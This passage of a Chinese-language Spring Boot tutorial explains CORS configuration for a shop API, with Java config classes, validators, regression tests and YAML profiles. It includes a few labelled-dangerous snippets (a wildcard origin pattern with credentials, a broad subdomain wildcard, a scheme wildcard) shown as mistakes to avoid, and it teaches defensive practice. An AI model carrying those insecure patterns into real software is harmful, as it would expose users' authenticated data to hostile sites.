    public CorsConfig(CorsProperties properties) {
        this.properties = properties;
    }

    /**
     * 唯一的 CORS 規則來源。
     *
     * <p>★ Security 的 {@code .cors(Customizer.withDefaults())} 會自動找到這個 bean，
     * 所以兩個 filter 共用同一份規則。
     */
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        var source = new UrlBasedCorsConfigurationSource();

        // ⚠️⚠️ 註冊順序【就是】比對順序，而且是【第一個匹配就贏】★★
        //
        //   UrlBasedCorsConfigurationSource.getCorsConfiguration()：
        //     for (Map.Entry<PathPattern, CorsConfiguration> entry : this.corsConfigurations.entrySet()) {
        //         if (entry.getKey().matches(path)) {
        //             return entry.getValue();          // ★ 直接 return，不比較精確度
        //         }
        //     }
        //   而 corsConfigurations 是 LinkedHashMap（保留插入順序）。
        //
        //   ★ 所以【最精確的要先註冊，"/**" 一定放最後】。
        //     反過來寫的話（"/**" 在最前面），後面所有的設定都是【死碼】——
        //     而且沒有任何警告：preflight 仍然回 200，只是套用了錯的規則。
        //
        //   🔴 這個 bug 的具體症狀（曾經發生）：
        //     /products/** 應該是 Allow-Origin: * （公開，讓 CDN 單一版本快取）
        //     但因為 "/**" 先註冊，實際套用的是 apiConfiguration()
        //     → 不在 allowedOrigins 裡的 origin 被 CorsFilter 擋成 403
        //     → 而 6.3.5 的「惡意 Origin 被拒絕」測試因此【通過】，
        //       6.10.4 的「公開端點的 Allow-Origin 是 *」測試因此【失敗】
        //     兩個測試互相矛盾 —— 那就是「順序寫反了」的指紋。

        // ── ① 最精確：SSE 端點（★ 需要不同的設定）──────────────────
        source.registerCorsConfiguration("/orders/*/events", sseConfiguration());

        // ── ② 公開端點（不需要 credentials，可以放寬）─────────────────
        source.registerCorsConfiguration("/products/**", publicConfiguration());
        source.registerCorsConfiguration("/categories/**", publicConfiguration());

        // ── ③ 最後才是萬用：一般 API ────────────────────────────────
        source.registerCorsConfiguration("/**", apiConfiguration());

        return source;
    }

    /**
     * ★★ 一個守住「順序沒被改壞」的測試。
     *
     * <p>它不檢查註冊順序（那是實作細節），而是<b>檢查行為</b>：
     * 問 source「這個路徑該用哪一份設定」，然後比對關鍵欄位。
     *
     * <p>放在 {@code CorsConfigurationOrderTest}（6.10.4）：
     * <pre>
     * &#64;Test
     * void 每個路徑都拿到正確的設定() {
     *     var source = (UrlBasedCorsConfigurationSource) context.getBean(CorsConfigurationSource.class);
     *
     *     assertThat(configFor(source, "/products/P-1001").getAllowedOrigins())
     *             .as("公開端點必須是 * —— 如果是具體的 origin 清單，代表 /** 搶先匹配了")
     *             .containsExactly("*");
     *
     *     assertThat(configFor(source, "/orders/ord_1/events").getMaxAge())
     *             .as("SSE 端點必須用 sseConfiguration()")
     *             .isEqualTo(SSE_MAX_AGE);
     *
     *     assertThat(configFor(source, "/orders").getAllowedOrigins())
     *             .as("一般 API 用具體的 origin 清單")
     *             .doesNotContain("*");
     * }
     * </pre>
     */

    /**
     * ★ 用 {@link FilterRegistrationBean} 而不是 {@code @Bean CorsFilter}：
     * 只有前者能設 order（04 章 4.4.2）。
     */
    @Bean
    public FilterRegistrationBean<CorsFilter> corsFilterRegistration(
            CorsConfigurationSource source) {
        var registration = new FilterRegistrationBean<>(new CorsFilter(source));
        registration.setOrder(CORS_FILTER_ORDER);
        registration.setName("corsFilter");
        // ★ ERROR dispatch 也要涵蓋 —— 否則 /error 的回應沒有 CORS 標頭
        registration.setDispatcherTypes(
                jakarta.servlet.DispatcherType.REQUEST,
                jakarta.servlet.DispatcherType.ERROR,
                jakarta.servlet.DispatcherType.ASYNC);
        return registration;
    }

    /**
     * ⚠️⚠️ <b>只設 {@code DispatcherType.ERROR} 是不夠的</b> ★★
     *
     * <p>{@code CorsFilter} 繼承 {@code OncePerRequestFilter}，而它的
     * {@code shouldNotFilterErrorDispatch()} <b>預設回傳 {@code true}</b>
     * ——「不要在 ERROR dispatch 執行」（04 章 4.4.1）。
     *
     * <p>所以即使 dispatcher types 包含了 {@code ERROR}，
     * {@code doFilterInternal} 仍然<b>不會</b>執行 ——
     * 設了等於沒設，而且完全沒有警告。
     *
     * <p>★ <b>兩個真正有效的做法</b>：
     *
     * <p><b>做法 A（shop-service 選這個）：讓 `/error` 的回應自己保住標頭。</b>
     * 03 章 3.10.1 的 {@code ProblemWriter} 在 {@code response.reset()} 之前
     * 先把 {@code Access-Control-*} 存下來、寫完之後再放回去。
     * 這樣不管回應是哪一層產生的，CORS 標頭都在。
     * <br>⚠️ 而 {@code reset()} 會清掉<b>所有</b>標頭 —— 這是 6.3.5 的核心細節。
     *
     * <p><b>做法 B：包一層覆寫 {@code shouldNotFilterErrorDispatch()}。</b>
     * <pre>
     * static class ErrorAwareCorsFilter extends CorsFilter {
     *     ErrorAwareCorsFilter(CorsConfigurationSource source) { super(source); }
     *     &#64;Override protected boolean shouldNotFilterErrorDispatch() { return false; }
     *     &#64;Override protected boolean shouldNotFilterAsyncDispatch() { return false; }
     * }
     * </pre>
     * ⚠️ 但要注意它會在同一個請求上跑第二次（04 章 4.4.6：
     * 「已執行過」的 attribute 已經被移除了），
     * 而 {@code CorsProcessor} 對「標頭已經存在」的處理是<b>覆寫</b> ——
     * 對 CORS 來說是冪等的，所以安全。
     *
     * <p>★ <b>shop-service 選 A 的理由</b>：做法 B 只涵蓋「容器發起的 ERROR dispatch」，
     * 而 {@code ProblemWriter} 涵蓋<b>所有</b>自己寫回應的地方
     * （限流的 429、大小限制的 413、Security 的 401）——
     * 那才是 6.2.1 那個事故的完整範圍。
     *
     * <p>⚠️ <b>兩個都做也可以</b>（防護重疊沒有壞處）。
     * 而 6.3.5 的 {@code CorsOnErrorResponsesTest} 是唯一能確認「真的有效」的方式 ——
     * 它列舉七種錯誤，每一種都斷言 {@code Access-Control-Allow-Origin} 存在。
     */

    // ── 三組設定 ─────────────────────────────────────────────────

    private CorsConfiguration apiConfiguration() {
        var config = new CorsConfiguration();

        // ★ 明確列出，不用 * —— 因為我們要 allowCredentials
        config.setAllowedOrigins(properties.allowedOrigins());

        config.setAllowedMethods(List.of(
                "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"));

        // ★ 明確列出 —— 尤其是 Authorization（* 不涵蓋它，6.3.3）
        config.setAllowedHeaders(List.of(
                "Authorization",
                "Content-Type",
                "Accept",
                "Accept-Language",
                "Idempotency-Key",          // 04 章 4.9
                "X-Request-Id",             // 04 章 4.5.2（上游傳入的 traceId）
                "If-Match",                 // 6.8.3
                "If-None-Match",
                "If-Modified-Since"));

        // ★★ 這是最容易漏的一組（6.3.3）
        config.setExposedHeaders(List.of(
                "Location",                 // POST 之後的新資源位置
                "ETag",                     // 6.8
                "X-Trace-Id",               // 04 章 4.5.4 —— 沒有這個，traceId 機制在瀏覽器端失效
                "Retry-After",              // 限流、503
                "X-RateLimit-Limit",
                "X-RateLimit-Remaining",
                "X-RateLimit-Reset",
                "X-Total-Count",            // 05 章 5.9.2
                "Content-Disposition",      // 05 章 5.10.6 的 blob 下載檔名
                "X-Content-SHA256",         // 05 章 5.10.4
                "X-Row-Count",
                "Idempotent-Replay"));      // 04 章 4.9.5

        // ★ 帶 cookie / Authorization
        config.setAllowCredentials(true);

        // ★ 7200 是 Chrome 的上限（6.3.2）—— 設更大只是誤導
        config.setMaxAge(7200L);

        return config;
    }

    /**
     * SSE 的 CORS 設定。
     *
     * <p>⚠️ 三個差異：
     * <ol>
     *   <li>只允許 {@code GET} 與 {@code OPTIONS}。</li>
     *   <li>要允許 {@code Last-Event-ID}（05 章 5.11.5）。
     *       ⚠️ 但注意：{@code EventSource} 自己送的 {@code Last-Event-ID}
     *       是<b>瀏覽器</b>送的，而瀏覽器對自己加的 {@code Last-Event-ID}
     *       <b>會</b>觸發 preflight —— 所以這一項是必要的。</li>
     *   <li>{@code maxAge} 設短一點：SSE 連線本身就很長，
     *       preflight 的快取沒什麼價值，而短的 maxAge 讓設定變更更快生效。</li>
     * </ol>
     */
    private CorsConfiguration sseConfiguration() {
        var config = new CorsConfiguration();
        config.setAllowedOrigins(properties.allowedOrigins());
        config.setAllowedMethods(List.of("GET", "OPTIONS"));
        config.setAllowedHeaders(List.of(
                "Authorization", "Accept", "Cache-Control", "Last-Event-ID"));
        config.setExposedHeaders(List.of("X-Trace-Id"));
        config.setAllowCredentials(true);
        config.setMaxAge(600L);
        return config;
    }

    /**
     * 公開端點的設定。
     *
     * <p>★ 這裡<b>可以</b>用 {@code *}，因為 {@code allowCredentials(false)}。
     * 好處：
     * <ul>
     *   <li>任何第三方（合作夥伴的網站、比價服務）都能直接讀商品資料。</li>
     *   <li>CDN 可以快取（不需要依 Origin 分版本 —— 見 6.3.8）。</li>
     * </ul>
     *
     * <p>⚠️ 前提是這些端點<b>真的</b>不含任何私有資料。
     * 如果 {@code GET /products/{id}} 對登入使用者會回「會員價」，
     * 那它就不是公開端點，不能用這組設定。
     */
    private CorsConfiguration publicConfiguration() {
        var config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("*"));
        config.setAllowedMethods(List.of("GET", "HEAD", "OPTIONS"));
        config.setAllowedHeaders(List.of("Accept", "Accept-Language", "If-None-Match"));
        config.setExposedHeaders(List.of("ETag", "X-Trace-Id"));
        config.setAllowCredentials(false);      // ★ 關鍵：所以 * 才合法
        config.setMaxAge(7200L);
        return config;
    }
}
```

```java
package example.shop.common.config;

import jakarta.validation.constraints.NotEmpty;
import jakarta.validation.constraints.Pattern;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.validation.annotation.Validated;

import java.util.List;

/**
 * CORS 的允許來源。
 *
 * <p>★ 為什麼要用 {@code @ConfigurationProperties} 而不是寫死：
 * 每個環境的前端網域不同（local / dev / staging / prod），
 * 而且加一個新的前端（例如客服後台）不該需要改 Java 程式碼。
 *
 * <p>★★ {@code @Pattern} 的驗證是刻意的：它在<b>啟動時</b>就擋掉
 * 三種危險的設定，而不是等上線後被滲透測試發現。
 */
@Validated
@ConfigurationProperties(prefix = "api.cors")
public record CorsProperties(

    /**
     * 允許的來源。
     *
     * <p>驗證規則：
     * <ul>
     *   <li>必須是 {@code scheme://host} 或 {@code scheme://host:port}
     *       —— <b>不可以有路徑</b>（Origin 沒有路徑，寫了也不會生效，
     *       但會讓人誤以為有作用）。</li>
     *   <li>不可以是 {@code *}（我們要 allowCredentials）。</li>
     *   <li>不可以有尾斜線（{@code https://shop.example/} 永遠不會匹配 ——
     *       這是最常見的設定錯誤）。</li>
     * </ul>
     */
    @NotEmpty(message = "至少要有一個允許的來源")
    List<@Pattern(
            regexp = "^https?://[a-zA-Z0-9.-]+(:\\d{1,5})?$",
            message = "必須是 scheme://host[:port]，不可有路徑或尾斜線，不可為 *"
    ) String> allowedOrigins,

    /**
     * 通配的來源模式（6.3.6）。
     *
     * <p>⚠️ <b>正式環境必須為空</b> —— 由 {@code CorsConfigurationValidator} 在啟動時強制。
     * 它存在的唯一理由是「每個 PR 一個預覽網域」與「本機的任意 port」。
     *
     * <p>刻意<b>不</b>加 {@code @Pattern}：通配模式的合法形式太多
     * （{@code https://*.a.example}、{@code http://localhost:[*]}），
     * regex 驗證會誤殺。防護改由 {@code CorsConfigurationValidator} 的
     * 「prod 一律不允許」來做 —— <b>那比「試圖驗證每一種模式」可靠得多</b>。
     */
    List<String> originPatterns

) {
    public CorsProperties {
        allowedOrigins  = (allowedOrigins == null)  ? List.of() : List.copyOf(allowedOrigins);
        originPatterns  = (originPatterns == null)  ? List.of() : List.copyOf(originPatterns);
    }
}
```

```yaml
api:
  cors:
    allowed-origins:
      - https://shop.example                # 顧客前台
      - https://admin.shop.example          # 客服後台
      - https://ops.shop.example            # 營運後台

---
spring:
  config:
    activate:
      on-profile: local
api:
  cors:
    allowed-origins:
      - http://localhost:5173               # Vite dev server
      - http://localhost:3000               # Next.js dev server
      - http://127.0.0.1:5173               # ⚠️ localhost 與 127.0.0.1 是不同的 origin！
```

⚠️ **`localhost` 與 `127.0.0.1` 是不同的 origin。**
只允許 `http://localhost:5173` 的話，
開發者用 `http://127.0.0.1:5173` 開頁面就會被擋 ——
而錯誤訊息只說「CORS policy」，他會花半小時懷疑後端壞了。
**兩個都列上。**

**修 B：`ProblemWriter` 的 `reset()` 要保留 CORS 標頭。** ★

```java
package example.shop.common.web;

import com.fasterxml.jackson.databind.ObjectMapper;
import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * 03 章 3.10.1 的 {@code ProblemWriter} 的最終版。
 *
 * <p>★★ 這一版相對 03 章的唯一改動：<b>{@code reset()} 之前先保存 CORS 標頭，
 * 之後再放回去</b>（6.3.5 的問題 B）。
 *
 * <p>為什麼需要：{@code HttpServletResponse.reset()} 會清空<b>所有</b>標頭，
 * 包含 {@code CorsFilter}（order -200）已經設好的
 * {@code Access-Control-Allow-Origin}。
 * 結果是「回應內容完全正確，但瀏覽器拒絕讓 JS 讀它」——
 * 而且症狀只出現在錯誤路徑上（6.2.1）。
 *
 * <p>⚠️ 為什麼不乾脆不呼叫 {@code reset()}：
 * 因為錯誤發生前可能已經寫了一部分標頭（{@code Content-Type: text/csv}、
 * {@code Content-Disposition}、甚至 {@code Content-Length}）。
 * 不 reset 的話回應會有矛盾的標頭 ——
 * 例如「{@code Content-Type: text/csv} 但 body 是 Problem JSON」。
 */
@Component
public class ProblemWriter {

    private static final Logger log = LoggerFactory.getLogger(ProblemWriter.class);

    /**
     * reset() 之後要復原的標頭。
     *
     * <p>★ 只有 CORS 相關的 —— 其他標頭（Content-Type、ETag…）
     * 在錯誤回應上本來就該被清掉。
     */
    private static final List<String> PRESERVED_HEADERS = List.of(
            HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN,
            HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS,
            HttpHeaders.ACCESS_CONTROL_EXPOSE_HEADERS,
            HttpHeaders.VARY);

    private final ProblemFactory problems;
    private final ObjectMapper objectMapper;

    public ProblemWriter(ProblemFactory problems, ObjectMapper objectMapper) {
        this.problems = problems;
        this.objectMapper = objectMapper;
    }

    public void write(HttpServletRequest request, HttpServletResponse response,
                      ErrorCode code, String detail) throws IOException {
        write(request, response, code, detail, Map.of());
    }

    public void write(HttpServletRequest request, HttpServletResponse response,
                      ErrorCode code, String detail,
                      Map<String, Object> extensions) throws IOException {
        Problem problem = problems.from(code, ProblemFactory.instanceOf(request),
                                        detail, extensions);
        writeProblem(response, problem, extensions);
    }

    public void write(HttpServletRequest request, HttpServletResponse response,
                      BusinessException ex) throws IOException {
        Problem problem = problems.from(ex, ProblemFactory.instanceOf(request));
        writeProblem(response, problem, ex.extensions());
    }

    private void writeProblem(HttpServletResponse response, Problem problem,
                              Map<String, Object> extensions) throws IOException {

        if (response.isCommitted()) {
            log.warn("回應已 committed，無法寫入錯誤 code={} traceId={}",
                     problem.code(), problem.traceId());
            return;
        }

        // ── ★★ 6.3.5：保存 CORS 標頭 ─────────────────────────────
        Map<String, List<String>> preserved = new LinkedHashMap<>();
        for (String name : PRESERVED_HEADERS) {
            var values = response.getHeaders(name);
            if (values != null && !values.isEmpty()) {
                preserved.put(name, List.copyOf(values));
            }
        }

        response.reset();

        // ── ★★ 放回去 ───────────────────────────────────────────
        preserved.forEach((name, values) -> {
            // ⚠️ 用 addHeader 而不是 setHeader —— Vary 可能有多個值
            values.forEach(value -> response.addHeader(name, value));
        });

        response.setStatus(problem.status());
        response.setContentType(MediaType.APPLICATION_PROBLEM_JSON_VALUE);
        response.setCharacterEncoding("UTF-8");
        response.setHeader(HttpHeaders.CACHE_CONTROL, "no-store");
        response.setHeader(ApiHeaders.TRACE_ID, problem.traceId());

        Object retryAfter = extensions.get("retryAfterSeconds");
        if (retryAfter instanceof Number n) {
            response.setHeader(HttpHeaders.RETRY_AFTER, String.valueOf(n.longValue()));
        }
        if (problem.status() == 401) {
            response.setHeader(HttpHeaders.WWW_AUTHENTICATE,
                    "Bearer realm=\"shop-api\", error=\"invalid_token\"");
        }

        objectMapper.writeValue(response.getOutputStream(), problem);
    }
}
```

⚠️ **`response.getHeaders(name)` 需要 Servlet 3.0+**（Boot 3 一定有）。
但要注意：**某些 response wrapper 沒有正確實作它**。
04 章 4.4.6 的 `ContentCachingResponseWrapper` 有實作，
但如果你自己寫了 wrapper 而沒有覆寫 `getHeaders`，
這裡就會拿到空清單 → CORS 標頭還是會遺失。

**一個守住這件事的測試**：

```java
package example.shop.common.web;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * 「每一種錯誤回應都要有 CORS 標頭」的回歸測試。
 *
 * <p>★★ 這個測試類別是 6.2.1 那個事故的直接產物。
 * 它的價值在於：<b>它涵蓋了「錯誤來自不同層」的所有情況</b>，
 * 而那正是問題的根源（成功路徑與錯誤路徑經過不同的程式碼）。
 */
@SpringBootTest
@AutoConfigureMockMvc
class CorsOnErrorResponsesTest {

    private static final String ORIGIN = "https://shop.example";

    @Autowired MockMvc mockMvc;

    @Test
    @DisplayName("Controller 的成功回應有 CORS 標頭")
    void 成功() throws Exception {
        mockMvc.perform(get("/products/P-1001").header("Origin", ORIGIN))
                .andExpect(status().isOk())
                .andExpect(header().string("Access-Control-Allow-Origin",
                        org.hamcrest.Matchers.notNullValue()));
    }

    @Test
    @DisplayName("advice 的 404 有 CORS 標頭")
    void 資源不存在() throws Exception {
        mockMvc.perform(get("/products/P-notexist").header("Origin", ORIGIN))
                .andExpect(status().isNotFound())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN));
    }

    @Test
    @DisplayName("端點不存在的 404 有 CORS 標頭（沒有 handler 的情況）")
    void 端點不存在() throws Exception {
        mockMvc.perform(get("/no-such-endpoint").header("Origin", ORIGIN))
                .andExpect(status().isNotFound())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN));
    }

    @Test
    @DisplayName("405 有 CORS 標頭")
    void 方法不允許() throws Exception {
        mockMvc.perform(delete("/products").header("Origin", ORIGIN))
                .andExpect(status().isMethodNotAllowed())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN));
    }

    @Test
    @DisplayName("驗證失敗的 422 有 CORS 標頭")
    void 驗證失敗() throws Exception {
        mockMvc.perform(post("/orders")
                        .header("Origin", ORIGIN)
                        .contentType("application/json")
                        .content("{}")
                        .with(customer("cus_1")))
                .andExpect(status().isUnprocessableEntity())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN));
    }

    @Test
    @DisplayName("★ 未認證的 401 有 CORS 標頭（Security 產生）")
    void 未認證() throws Exception {
        mockMvc.perform(get("/orders").header("Origin", ORIGIN))
                .andExpect(status().isUnauthorized())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN))
                // ★ 而且要能讀到 X-Trace-Id（否則使用者無法提供給客服）
                .andExpect(header().string("Access-Control-Expose-Headers",
                        org.hamcrest.Matchers.containsString("X-Trace-Id")));
    }

    @Test
    @DisplayName("★★ Filter 產生的 413 有 CORS 標頭（order -118，在 Security 之前）")
    void 檔案過大() throws Exception {
        byte[] tooBig = new byte[2 * 1024 * 1024];

        mockMvc.perform(post("/orders")
                        .header("Origin", ORIGIN)
                        .contentType("application/json")
                        .content(tooBig)
                        .with(customer("cus_1")))
                .andExpect(status().isPayloadTooLarge())
                // ★ 這個斷言在修 6.3.5 之前會失敗
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN))
                .andExpect(header().string("Access-Control-Expose-Headers",
                        org.hamcrest.Matchers.containsString("Retry-After")));
    }

    @Test
    @DisplayName("★★ Filter 產生的 429 有 CORS 標頭（order -119）")
    void 限流() throws Exception {
        // 打到超過限流上限
        for (int i = 0; i < 100; i++) {
            mockMvc.perform(get("/products").header("Origin", ORIGIN));
        }
        mockMvc.perform(get("/products").header("Origin", ORIGIN))
                .andExpect(status().isTooManyRequests())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN));
    }

    @Test
    @DisplayName("★ 308 轉址有 CORS 標頭（order -120）")
    void 尾斜線轉址() throws Exception {
        mockMvc.perform(get("/orders/").header("Origin", ORIGIN)
                        .with(customer("cus_1")))
                .andExpect(status().isPermanentRedirect())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN))
                // ★ 轉址的 Location 也要 expose，否則前端不知道要去哪
                .andExpect(header().string("Access-Control-Expose-Headers",
                        org.hamcrest.Matchers.containsString("Location")));
    }

    @Test
    @DisplayName("★ 500 有 CORS 標頭（最重要的一個 —— 使用者最需要 traceId 的時候）")
    void 內部錯誤() throws Exception {
        mockMvc.perform(get("/probe/boom").header("Origin", ORIGIN)
                        .with(customer("cus_1")))
                .andExpect(status().isInternalServerError())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN))
                .andExpect(header().string("Access-Control-Expose-Headers",
                        org.hamcrest.Matchers.containsString("X-Trace-Id")));
    }

    @Test
    @DisplayName("不在白名單的 Origin 被拒絕（而且不是反射回去）")
    void 惡意Origin() throws Exception {
        mockMvc.perform(get("/products/P-1001").header("Origin", "https://evil.example"))
                // ⚠️ 注意：CorsFilter 對「不允許的 origin」回 403，
                //    而且回應【沒有】Access-Control-Allow-Origin
                .andExpect(status().isForbidden())
                .andExpect(header().doesNotExist("Access-Control-Allow-Origin"));
    }

    @Test
    @DisplayName("preflight 不需要認證")
    void preflight() throws Exception {
        mockMvc.perform(options("/orders")
                        .header("Origin", ORIGIN)
                        .header("Access-Control-Request-Method", "POST")
                        .header("Access-Control-Request-Headers",
                                "authorization,content-type,idempotency-key"))
                // ★ 200 而不是 401 —— preflight 不帶 Authorization
                .andExpect(status().isOk())
                .andExpect(header().string("Access-Control-Allow-Origin", ORIGIN))
                .andExpect(header().string("Access-Control-Allow-Methods",
                        org.hamcrest.Matchers.containsString("POST")))
                // ★ Authorization 必須被明確允許（6.3.3 的 * 陷阱）
                .andExpect(header().string("Access-Control-Allow-Headers",
                        org.hamcrest.Matchers.containsString("Authorization")))
                .andExpect(header().string("Access-Control-Max-Age", "7200"))
                .andExpect(header().string("Vary",
                        org.hamcrest.Matchers.containsString("Origin")));
    }

    // 輔助方法略（同 05 章 5.13.1）
}
```

⚠️ **`惡意Origin` 那個測試的斷言值得說明**：
Spring 的 `CorsFilter` 對「不允許的 origin」回 **403 且不呼叫 filter chain**。
這代表**業務邏輯完全不執行** —— 比「執行了但瀏覽器擋住回應」好。

**但這也有一個副作用**：非瀏覽器的客戶端（curl、後端服務、Postman）
如果不小心帶了 `Origin` 標頭，就會被擋掉 403。

```bash
# ⚠️ 這會被擋
curl -H "Origin: https://random.example" https://api.shop.example/products

# ✅ 不帶 Origin 就沒事（CorsFilter 只處理有 Origin 的請求）
curl https://api.shop.example/products
```

**這是正確的行為**（只有瀏覽器會自動帶 `Origin`），
但值得寫在 API 文件裡，否則會有合作夥伴來問。

### 6.3.6 `allowedOrigins` vs `allowedOriginPatterns`

```java
    // ① 明確清單 —— 精確比對
    config.setAllowedOrigins(List.of("https://shop.example", "https://admin.shop.example"));

    // ② 模式 —— 支援通配
    config.setAllowedOriginPatterns(List.of("https://*.shop.example"));
```

| | `allowedOrigins` | `allowedOriginPatterns` |
|---|---|---|
| 比對方式 | 字串精確相等 | 支援 `*`（可在子網域、port 位置） |
| 與 `allowCredentials(true)` | ✅ 可用（但不可含 `*`） | ✅ **可用，而且可含 `*`** |
| 回應的 `Allow-Origin` | 原樣回傳清單中的那一個 | **回傳請求的 `Origin`** |
| 安全性 | 最高 | ⚠️ **取決於模式寫得多嚴** |

⚠️ **`allowedOriginPatterns` 是「反射 Origin」的安全版本**：
它會把請求的 `Origin` 回傳，但**只有在符合模式時才會**。

**模式寫錯的三種危險寫法**：

```java
    // 🔴 危險 1：太寬
    config.setAllowedOriginPatterns(List.of("*"));
    // 效果 = 反射任何 Origin + credentials = 6.2.2 的漏洞

    // 🔴 危險 2：子網域通配沒想清楚
    config.setAllowedOriginPatterns(List.of("https://*.shop.example"));
    // ⚠️ 如果你的網域允許使用者自訂子網域（多租戶 SaaS），
    //    攻擊者註冊 evil.shop.example 就能讀所有人的資料

    // 🔴 危險 3：忘記 scheme
    config.setAllowedOriginPatterns(List.of("*://shop.example"));
    // ⚠️ 允許 http://shop.example → 中間人可以偽造回應
```

**shop-service 的決定：用 `allowedOrigins`（明確清單）。**

理由：

| 理由 | 說明 |
|---|---|
| 前端網域只有 3 個，而且不會頻繁變 | 通配沒有帶來便利 |
| 明確清單在 code review 時一目了然 | 「加一個 origin」是一個明確的 PR |
| **`@Pattern` 可以驗證每一項** | 6.3.5 的 `CorsProperties` —— 通配模式很難驗證 |

**什麼時候該用 `allowedOriginPatterns`**：

```java
    // ✅ 合理用途 1：預覽環境（每個 PR 一個網域）
    config.setAllowedOriginPatterns(List.of(
            "https://pr-*.preview.shop.example"));

    // ✅ 合理用途 2：本機開發的任意 port
    //    （⚠️ 只在 local profile！）
    config.setAllowedOriginPatterns(List.of(
            "http://localhost:[*]",
            "http://127.0.0.1:[*]"));
```

⚠️ **`[*]` 這個語法**（方括號）是 Spring 用來通配 **port** 的：
`http://localhost:[*]` 匹配任何 port。
用 `http://localhost:*` 是**錯的**（`*` 在 Spring 的 pattern 裡不匹配 `:`）。

**「預覽環境」的完整寫法**（一個實務上很有用的模式）：

```java
    private CorsConfiguration apiConfiguration() {
        var config = new CorsConfiguration();

        // ★ 正式的 origin 用明確清單
        config.setAllowedOrigins(properties.allowedOrigins());

        // ★ 預覽 / 開發的 origin 用模式，而且【只在非 prod 環境】
        if (!properties.originPatterns().isEmpty()) {
            config.setAllowedOriginPatterns(properties.originPatterns());
        }
        // ...
    }
```

```yaml
# application.yml（prod 沒有 origin-patterns）
api:
  cors:
    allowed-origins:
      - https://shop.example

---
spring:
  config:
    activate:
      on-profile: dev
api:
  cors:
    allowed-origins:
      - https://dev.shop.example
    origin-patterns:
      - "https://pr-*.preview.shop.example"
```

**加一個啟動時的檢查，讓「prod 有通配」變成啟動失敗**：

```java
package example.shop.common.config;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.ApplicationListener;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Component;

/**
 * CORS 設定的啟動時檢查。
 *
 * <p>★ 為什麼要在啟動時失敗而不是只記 WARN：
 * 「prod 的 CORS 開太寬」是一個<b>資料洩漏等級</b>的問題，
 * 而 WARN 在 CI/CD 的輸出裡沒有人會看到。
 *
 * <p>⚠️ 這個檢查刻意放在 {@code ApplicationReadyEvent}（而不是 bean 初始化）：
 * 那樣錯誤訊息會出現在啟動日誌的最後，而不是被幾百行 Spring 的訊息埋掉。
 */
@Component
public class CorsConfigurationValidator implements ApplicationListener<ApplicationReadyEvent> {

    private static final Logger log = LoggerFactory.getLogger(CorsConfigurationValidator.class);

    private final CorsProperties properties;
    private final Environment environment;

    public CorsConfigurationValidator(CorsProperties properties, Environment environment) {
        this.properties = properties;
        this.environment = environment;
    }

    @Override
    public void onApplicationEvent(ApplicationReadyEvent event) {
        boolean production = java.util.Arrays.asList(environment.getActiveProfiles())
                .contains("prod");

        for (String origin : properties.allowedOrigins()) {
            // ① 任何環境都不允許 *
            if ("*".equals(origin)) {
                throw new IllegalStateException(
                        "api.cors.allowed-origins 不可為 \"*\"（我們啟用了 allowCredentials）");
            }
            // ② 尾斜線是最常見的設定錯誤（永遠不會匹配）
            if (origin.endsWith("/")) {
                throw new IllegalStateException(
                        "api.cors.allowed-origins 的 \"%s\" 有尾斜線 —— Origin 標頭沒有路徑，"
                        .formatted(origin) + "這一項永遠不會匹配任何請求");
            }
            // ③ prod 不允許 http（除非是內網 IP）
            if (production && origin.startsWith("http://")) {
                throw new IllegalStateException(
                        "prod 環境的 api.cors.allowed-origins 不可為 http：" + origin);
            }
            // ④ prod 不允許 localhost
            if (production && (origin.contains("localhost") || origin.contains("127.0.0.1"))) {
                throw new IllegalStateException(
                        "prod 環境的 api.cors.allowed-origins 不可含 localhost：" + origin);
            }
        }

        if (production && !properties.originPatterns().isEmpty()) {
            throw new IllegalStateException(
                    "prod 環境不可使用 api.cors.origin-patterns（通配的 origin）");
        }

        log.info("CORS 設定檢查通過 origins={} patterns={} production={}",
                 properties.allowedOrigins(), properties.originPatterns(), production);
    }
}
```

⚠️ **第 ② 條（尾斜線）值得單獨強調**，因為它是**最常見的 CORS 設定錯誤**：

```yaml
api:
  cors:
    allowed-origins:
      - https://shop.example/        # 🔴 尾斜線
```

`Origin` 標頭的值**永遠不含路徑也不含尾斜線**（`https://shop.example`），
所以這一項永遠不會匹配。而症狀是「設定明明寫了卻還是被 CORS 擋」——
工程師會反覆檢查 YAML，因為那一行「看起來完全正確」。

### 6.3.7 `Vary: Origin`：快取污染

**問題**：

```
① 使用者 A（origin: https://shop.example）請求 GET /products/P-1
   → 回應：200 + Access-Control-Allow-Origin: https://shop.example
   → CDN 快取了這個回應（含那個標頭）

② 使用者 B（origin: https://admin.shop.example）請求同一個 URL
   → CDN 回傳快取的版本
   → Access-Control-Allow-Origin: https://shop.example      🔴 不是 B 的 origin
   → 瀏覽器擋掉
```

